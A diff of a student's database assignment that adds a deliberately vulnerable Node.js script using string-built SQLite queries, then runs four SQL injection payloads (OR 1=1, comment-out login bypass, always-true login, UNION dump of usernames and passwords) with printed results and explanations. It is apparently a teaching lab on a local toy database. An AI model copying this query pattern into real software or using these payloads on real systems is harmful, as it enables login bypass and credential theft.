@@ -2,9 +2,8 @@
 Name: KOMUNTALE MELANIE MARIA
 DATE: 22ND APRIL 2026
 
-TASK 1 - Build the Nyondo Stock Database
+TASK 1 
 
-// setup.js
 // setup.js
 const Database = require('better-sqlite3');
 const db = new Database('nyondo_stock.db');
@@ -322,3 +321,148 @@ Confirm with SELECT *:
   }
 ]
 
+
+//TASK 3
+
+// vulnerable.js
+
+
+const Database = require('better-sqlite3');
+const db = new Database('nyondo_stock.db');
+
+function searchProduct(name) {
+  const query = `SELECT * FROM products WHERE name LIKE '%${name}%'`;
+  const rows = db.prepare(query).all();
+  console.log( rows, '\n');
+  return rows;
+}
+
+function login(username, password) {
+  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+  const row = db.prepare(query).get();
+  console.log(row,'\n');
+  return row;
+}
+
+
+// ATTACK CALLS 
+console.log('ATTACK 1 - Dump all products');
+searchProduct("' OR 1=1--");
+
+console.log('ATTACK 2 - Login bypass with no password');
+login("admin'--", "anything");
+
+console.log('ATTACK 3 - Always true login');
+login("' OR '1'='1", "' OR '1'='1");
+
+console.log('ATTACK 4 - UNION attack (steal users via product search)');
+searchProduct("' UNION SELECT id, username, password, role FROM users--");
+
+// EXACT QUERIES PRINTED OUTPUT
+
+ATTACK 1
+  SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+RESULT
+[
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+] 
+
+ 
+Why it worked:
+  The OR 1=1 condition is always true, so the WHERE clause is bypassed completely
+  and the database returns every row in the products table.
+ 
+ATTACK 2
+  SELECT * FROM users WHERE username='admin'--' AND password='anything'
+ 
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' } 
+ 
+Why it worked:
+  The -- starts a SQL comment, which causes the database to ignore everything
+  after it, including the password check, so any password is accepted for admin.
+ 
+ATTACK 3: Always-true login ----
+  SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
+ 
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'admin' } 
+ 
+Why it worked:
+  The OR '1'='1' condition is always true, so the WHERE clause is satisfied
+  for every row. The database returns the first user without any real credentials.
+  
+ATTACK 4
+  SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, username, password, role FROM users--%'
+ 
+Result: [
+  {
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  { id: 1, name: 'admin', description: 'admin123', price: 'admin' },
+  {
+    id: 2,
+    name: 'Iron Sheet 3m',
+    description: 'Gauge 30 roofing sheet 3m long',
+    price: 110000
+  },
+  { id: 2, name: 'fatuma', description: 'pass456', price: 'attendant' },
+  {
+    id: 3,
+    name: 'Paint 5L',
+    description: 'Exterior wall paint white 5L',
+    price: 60000
+  },
+  { id: 3, name: 'wasswa', description: 'pass789', price: 'manager' },
+  {
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
+  },
+  {
+    id: 5,
+    name: 'Timber 2x4',
+    description: 'Pine timber plank 2x4 per metre',
+    price: 25000
+  }
+] 
+ 
+Why it worked:
+  The UNION keyword joins a second SELECT onto the original query. Because the
+  columns match in count, the users table data is returned through the product
+  search function, exposing all usernames and passwords.
+ 
+
+ 
+ 
